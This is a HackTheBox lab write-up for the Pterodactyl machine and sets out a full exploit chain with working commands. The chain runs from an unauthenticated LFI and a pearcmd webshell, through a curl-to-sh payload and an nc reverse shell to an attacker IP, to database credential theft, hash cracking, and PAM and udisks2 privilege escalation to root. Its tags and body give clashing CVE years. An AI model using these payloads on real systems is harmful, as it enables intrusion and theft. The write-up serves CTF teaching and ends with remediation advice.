---
title: "Pterodactyl"
date: 2026-05-17 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [Pterodactyl, LFI-To-RCE, CVE-2026-6018, CVE-2026-6019]
description: Writeup for HackTheBox Pterodactyl machine
image:
  path: assets/img/pterodactyl/pterodactyl.png
  alt: HTB Pterodactyl
---

## Executive Summary

This assessment demonstrates a complete attack chain against a game server management panel based on Pterodactyl. The vulnerability chain includes:

- **CVE-2025-49132**: Unauthenticated Local File Inclusion (LFI) in Pterodactyl Panel v1.11.10
- **PHP-PEAR Abuse**: Post-exploitation RCE via pearcmd configuration manipulation
- **CVE-2025-6018**: PAM environment variable manipulation bypass in openSUSE Leap 15
- **CVE-2025-6019**: Privilege escalation via XFS filesystem mounting in libblockdev
- **Credential Harvesting**: Database credential extraction and password hash cracking

---

## Reconnaissance

### Network Enumeration

#### Initial Port Scan

The reconnaissance phase begins with identifying all open ports on the target system using an aggressive nmap scan. The command uses a combination of fast port discovery and targeted scanning:

```bash
# -sC: Run default NSE (Nmap Scripting Engine) scripts for service detection
# -sV: Probe open ports to determine service/version info
# -Pn: Skip host discovery (treat all hosts as online)
# -p $(nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,): Dynamically discover all open ports
# -oN: Output results in normal format to nmap.scan file
sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 8000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan
```

**Nmap Output:**
```
Nmap scan report for 10.129.42.218
Host is up, received echo-reply ttl 63 (0.22s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.21.5
```

**Analysis:** Two main services are exposed:
- **SSH (22)**: OpenSSH 9.6 - Recent version, likely patched against known SSH vulnerabilities
- **HTTP (80)**: nginx 1.21.5 - Web server with redirect to `pterodactyl.htb` suggesting virtual hosting

#### Host Configuration

Add the discovered hostname to the local `/etc/hosts` file for proper DNS resolution:

```bash
# Add target IP and hostname mapping for local resolution
echo "$ip  pterodactyl.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access - Web Application Analysis

### Web Service Discovery

Navigating to `http://pterodactyl.htb` reveals a game server monitoring platform called "MonitorLand" built on the Pterodactyl panel.

<img src="assets/img/pterodactyl/pterodactyl_htb.png" alt="MonitorLand Homepage">

**Pterodactyl Background:** Pterodactyl is an open-source game server management panel written in PHP, React, and Go. It isolates game servers in Docker containers while providing a web-based management interface. The panel handles multiple game servers including Minecraft, Rust, and other popular games.

### Information Disclosure via Changelog

The `/changelog.txt` file provides valuable system information:

```bash
curl http://pterodactyl.htb/changelog.txt
```

```
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

**Critical Findings:**
- **Panel Version**: Pterodactyl v1.11.10
- **Database**: MariaDB 11.8.3 backend
- **PHP Extensions**: PHP-FPM and PHP-PEAR are enabled

### PHP Configuration Analysis

PHP-FPM (FastCGI Process Manager) maintains a pool of worker processes for handling PHP requests, providing better performance than traditional CGI. PHP-PEAR (PHP Extension and Application Repository) is a package management system that provides the `pear` CLI tool. The `phpinfo.php` page confirms these configurations:

<img src="assets/img/pterodactyl/phpinfo.png" alt="PHP Configuration">

---

## Virtual Host Enumeration

### Subdomain Discovery

Gobuster is used to discover additional virtual hosts:

```bash
# vhost mode: enumerate virtual hosts
# -w: wordlist for subdomain discovery
# -t 40: Use 40 threads for faster enumeration
# --ad: Append discovered domains to /etc/hosts
gobuster vhost -u http://pterodactyl.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40 --ad
```

**Gobuster Output:**
```
panel.pterodactyl.htb Status: 200 [Size: 1897]
```

This reveals `panel.pterodactyl.htb` hosting the Pterodactyl administration panel.

---

## Exploitation - CVE-2025-49132

### Vulnerability Overview

**CVE-2025-49132** is a critical Local File Inclusion (LFI) vulnerability affecting Pterodactyl Panel versions up to 1.11.10.

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-49132 |
| Affected Component | Pterodactyl Panel `/api/locales/locale.json` endpoint |
| Vulnerability Type | Unauthenticated Local File Inclusion (LFI) |
| Attack Vector | GET parameters `locale` and `namespace` |
| Impact | Remote Code Execution |

### Technical Analysis

The vulnerable endpoint resides in the `LocaleController` class:

```php
use Illuminate\Translation\Translator;

class LocaleController extends Controller {
    protected Loader $loader;

    public function __construct(Translator $translator){
        $this->loader = $translator->getLoader();
    }

    // Vulnerable code - user input passed directly to loader
    $locales = explode(' ', $request->input('locale') ?? '');
    $namespaces = explode(' ', $request->input('namespace') ?? '');
    $response = [];

    foreach ($locales as $locale) {
        $response[$locale] = [];
        foreach ($namespaces as $namespace) {
            $response[$locale][$namespace] = $this->i18n(
            $this->loader->load($locale, str_replace('.', '/', $namespace))
            );
        } 
    } 
}
```

The vulnerability stems from the `str_replace('.', '/', $namespace)` call which allows path traversal. The Laravel `Translator`'s loader prepends the locale path, enabling `../` sequences to escape the intended directory. However, due to PHP localization file format requirements, only `.php` files can be read through this vector.

### Exploitation - Database Credential Theft

Using the LFI vulnerability to extract database credentials:

```bash
# The vulnerable endpoint accepts locale and namespace parameters
# By traversing directories and pointing to the config path, we can read sensitive files
# locale=../../../pterodactyl: Traveerse to panel root directory
# namespace=config/database: Target Laravel database configuration file
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database' | jq 
```

**Extracted Credentials:**
```json
{
  "default": "mysql",
  "connections": {
    "mysql": {
      "driver": "mysql",
      "host": "127.0.0.1",
      "port": "3306",
      "database": "panel",
      "username": "pterodactyl",
      "password": "PteraPanel",
      // ... connection details
    }
  }
}
```

**Credentials Found:**
- **Database**: `panel`
- **Username**: `pterodactyl`
- **Password**: `PteraPanel`

### Application Key Extraction

The Laravel `APP_KEY` is crucial for cookie encryption/decryption attacks:

```bash
# Extract the application key from config/app.php
# APP_KEY is used to encrypt Laravel session cookies and can enable deserialization RCE
curl -s 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app' | jq
```

**Extracted APP_KEY:**
```
"key": "base64{UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=}"
```

This key uses AES-256-CBC cipher for Laravel's encrypted cookies. Testing with `laravel-crypto-killer`:

```bash
# Decrypt an existing encrypted cookie cookie using the leaked APP_KEY
# The tool decrypts Laravel's encrypted cookie format (base64 IV + encrypted value)
python3 laravel_crypto_killer.py decrypt -v eyJpdiI6Im1ZeExWeDRZNGFRZWZoOEdzbFBDN1E9PSIsInZhbHVlIjoiQUlNZTRodkRwcWxMc2VCRGV3ckFMd3hSQTRIZHJINS8vWWJuZktyVFFrb2ZkMG1jcTFybG0xQzluZTlwS1JLcHZvQklVYy82N212V1VSdFlQT0xMZ0xiSG5TbFJBUlAzTVJRd0lCc3dxeHVob3VXUVpHS25mREQ4T2tRbDNUemsiLCJtYWMiOiJmN2E5MTU2OGYyZThmMTIwNGViY2Y4NjhjMzZmODcxNWU3YjkzZDQzYWQwOGFkOTQwNjgzYzdjNDE2OTNmMzZjIiwidGFnIjoiIn0= -k base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
```

The cookie format is hashed, requiring an alternative exploitation path.

---

## Remote Code Execution via PHP-PEAR

### Technical Background

PHP-PEAR abuse exploits the `register_argc_argv` PHP configuration. When enabled, PHP treats query string parameters as command-line arguments (`$_SERVER['argv']`). The `pearcmd.php` utility can then be manipulated to execute arbitrary commands.

RFC 3875 specifies that query strings should be passed as CLI arguments for CGI PHP, but PHP doesn't strictly follow this. Even with `=` characters in the query string, PHP still populates `$_SERVER['argv']`.

### Exploitation Strategy

The `pearcmd.php` tool supports the `config-create` command which can write arbitrary content to files:

```bash
# Exploit pearcmd to create a PHP webshell
# +config-create+: PEAR command to create configuration
# /../../../usr/share/php/PEAR: Target directory path (traversed)
# namespace=pearcmd: Invokes pearcmd via LFI
# The query parameters after ? are passed as CLI arguments to pearcmd
curl -g $'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system(\'curl${IFS}10.10.15.113/rev.sh|sh\')?>+/tmp/shell.php'
```

### Payload and Listener Setup

Create a reverse shell payload script:

```bash
# Read the payload file - uses FIFO for reliable reverse shell
cat rev.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.113 4444 >/tmp/f

# Start a PHP web server to host the payload
php -S 0.0.0.0:80

# Start netcat listener for reverse shell
ncat -lvnp 4444
```

### Shell Execution and Capture

Execute the uploaded shell through the LFI endpoint:

```bash
# Trigger the shell by requesting the uploaded file via LFI
# The path ../../../../../../tmp points to /tmp where shell.php was written
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&namespace=shell'
```

**Connection Log:**
```
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Accepted
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 [200]: GET /rev.sh
[Wed May 20 17:36:43 2026] 10.129.43.57:36042 Closing

Ncat: Connection from 10.129.43.57:60896.
sh: cannot set terminal process group (1214): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$ id
uid=474(wwwrun) gid=474(www) groups=474(www)
```

**Success**: Low-privilege shell obtained as `wwwrun` user.

---

## User Flag Acquisition

### Shell Upgrade

Upgrade the raw shell to an interactive terminal:

```bash
# Create a pseudo-terminal session
script -c bash /dev/null

# Suspend the process with Ctrl+Z and adjust terminal settings
stty -echo raw; fg
reset
# Type 'screen' when prompted for terminal type

# Set proper terminal dimensions
stty rows 37 cols 145
```

### User Flag Location

Navigate to the user's home directory and read the flag:

```bash
cd /home/phileasfogg3/
ls
# bin  user.txt
cat user.txt 
# **************cc2104220c779905
```

---

## Privilege Escalation

### System Enumeration

Identify running services and users with shell access:

```bash
# Enumerate listening TCP/UDP services
ss -tulnp

# List users with interactive shells
cat /etc/passwd | grep 'sh$'
```

**Key Services:**
- MariaDB on port 3306 (localhost)
- Redis on port 6379 (socket)
- PHP-FPM on port 9000

**Users with Shell Access:**
- root, nobody, headmonitor, phileasfogg3

### Database Credential Harvesting

Query the database for user credentials:

```bash
mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "show tables;"
mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 -D panel -e "select username, password from users;"
```

**Extracted Hashes:**
```
+--------------+--------------------------------------------------------------+
| username     | password                                                     |
+--------------+--------------------------------------------------------------+
| headmonitor  | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 |
| phileasfogg3 | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi |
+--------------+--------------------------------------------------------------+
```

### Password Hash Cracking

The bcrypt hashes are cracked offline:

```bash
# john reads the hash file and performs dictionary attack with rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Cracked Password:** `phileasfogg3:!QAZ2wsx`

### SSH Access with Cracked Credentials

Establish SSH connection for more stable access:

```bash
# sshpass provides password authentication for non-interactive scripts
# StrictHostKeyChecking=no bypasses host key verification for CTF
sshpass -p '!QAZ2wsx' ssh -o StrictHostKeyChecking=no phileasfogg3@pterodactyl.htb
```

---

## CVE-2025-6018 & CVE-2025-6019 Exploitation

### Vulnerability Overview

**CVE-2025-6018** - PAM Environment Variable Bypass

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-6018 |
| Component | PAM configuration in openSUSE Leap 15/SLES |
| Vulnerability Type | Authentication Bypass |
| Attack Vector | `~/.pam_environment` manipulation |
| Impact | Polkit "allow_active" privilege escalation |

**CVE-2025-6019** - libblockdev XFS Mounting Vulnerability

| Attribute | Detail |
|-----------|--------|
| CVE ID | CVE-2025-6019 |
| Component | libblockdev via udisks2 daemon |
| Vulnerability Type | Privilege Escalation via SUID binaries |
| Attack Vector | XFS filesystem with SUID binary |
| Impact | Full root access |

### Technical Analysis

#### CVE-2025-6018 - PAM Bypass

openSUSE Leap 15 uses the `targetpw` authentication mechanism where users must enter the target user's password when using sudo. However, CVE-2025-6018 allows bypassing this by manipulating PAM environment variables.

The attack exploits how `systemd-logind` determines user session status. Normally, SSH sessions are marked as "allow_any" (remote) while physical console sessions are "allow_active". By setting `XDG_SEAT=seat0` and `XDG_VTNR=1` in `~/.pam_environment`, SSH sessions are incorrectly identified as physical sessions.

**Verification Before Exploitation:**
```bash
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# ('challenge',) - indicates remote/unprivileged session
```

#### CVE-2025-6019 - libblockdev SUID Escalation

libblockdev is a library for block device manipulation used by udisks2. When resizing XFS filesystems, it temporarily mounts them in `/tmp` without `nosuid` or `nodev` flags - a security oversight.

An attacker can:
1. Create a malicious XFS image containing a SUID binary
2. Set up a loop device backed by this image
3. Request filesystem resize via udisks2
4. The resize operation mounts the XFS without proper restrictions
5. Execute the embedded SUID binary to gain root privileges

### Exploitation Chain

#### Step 1: Establish Physical Session Status

```bash
# Set environment variables to mimic a physical console session
# OVERRIDE keyword tells PAM to always set these values regardless of other configurations
{ echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR OVERRIDE=1'; } > ~/.pam_environment

# Exit and reconnect to apply PAM changes
exit
```

After reconnection, verify the polkit status:

```bash
# CanReboot now returns 'yes' instead of 'challenge'
# This confirms we now have 'allow_active' privileges
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# ('yes',)
```

#### Step 2: Prepare Malicious XFS Filesystem

On the attacker machine, create an XFS filesystem with a SUID bash binary:

```bash
# Create 300MB disk image
# /dev/zero provides null bytes for the image
# bs=1M: block size 1MB
dd if=/dev/zero of=./xfs.image bs=1M count=300

# Format as XFS filesystem
mkfs.xfs ./xfs.image

# Mount the filesystem to write files
sudo mount -t xfs ./xfs.image ./xfs.mount

# Copy bash binary and set SUID bit (04555 = setuid + executable)
sudo cp ./bash ./xfs.mount
sudo chmod 04555 ./xfs.mount/bash

# Unmount and transfer to target
sudo umount ./xfs.mount
```

#### Step 3: Transfer and Execute Payload

On the target machine:

```bash
# Transfer the XFS image
sshpass -p '!QAZ2wsx' scp -o StrictHostKeyChecking=no xfs.image phileasfogg3@pterodactyl.htb:/home/phileasfogg3/xfs.image

# Kill any auto-mounters that might interfere
pkill -KILL gvfs-udisks2-volume-monitor

# Create loop device - udisksctl manages loop devices safely
LOOP_DEV=$(udisksctl loop-setup --file ./xfs.image --no-user-interaction 2>&1 | grep -oP "/dev/loop\\d+")

# Start monitoring loop to catch the mounted SUID binary
# This polls /tmp/blockdev* directories for the SUID bash
( while true; do for dev in /tmp/blockdev*; do 
    if [ -d "$dev" ] && [ -x "$dev/bash" ]; then 
        echo "Caught SUID bash at $dev/bash"; 
        "$dev/bash" -p -c "id; cat /root/root.txt" > /tmp/root_out.txt 2>&1; 
        break 2; 
    fi; 
  done; 
  sleep 0.001; 
done ) &
```

#### Step 4: Trigger Privilege Escalation

```bash
# Request XFS filesystem resize via D-Bus
# This causes libblockdev to mount the XFS in /tmp without nosuid
gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/$(basename "$LOOP_DEV") --method org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" 2>/dev/null

# Wait for the operation to complete
sleep 30
```

#### Step 5: Retrieve Root Flag

```bash
cat /tmp/root_out.txt
# ************244bgew4435er0er35
```

---

## Summary

This assessment demonstrated a complex exploitation chain combining web application vulnerabilities with operating system-level security issues:

### Attack Chain:
1. **Information Disclosure**: Changelog file revealed Pterodactyl version and environment
2. **CVE-2025-49132 (LFI)**: Extracted database credentials and Laravel APP_KEY
3. **PHP-PEAR Abuse**: Achieved RCE via pearcmd manipulation and LFI
4. **Credential Harvesting**: Obtained password hashes from database
5. **Password Cracking**: Cracked bcrypt hashes offline
6. **CVE-2025-6018**: Bypassed PAM `targetpw` restriction via environment variable injection
7. **CVE-2025-6019**: Escalated to root via XFS filesystem mounting vulnerability

### Recommendations:
1. **Update Pterodactyl** to latest version (≥ v1.11.11) to patch CVE-2025-49132
2. **Disable register_argc_argv** in PHP configuration when not needed
3. **Remove PHP-PEAR** or restrict access if not actively used
4. **Update openSUSE Leap** to latest security patches (CVE-2025-6018/6019 resolved)
5. **Implement Web Application Firewall** to detect LFI attempts
6. **Use strong, unique passwords** for all user accounts
7. **Restrict udisks2** access to only authorized users
8. **Enable audit logging** for polkit and PAM authentication events
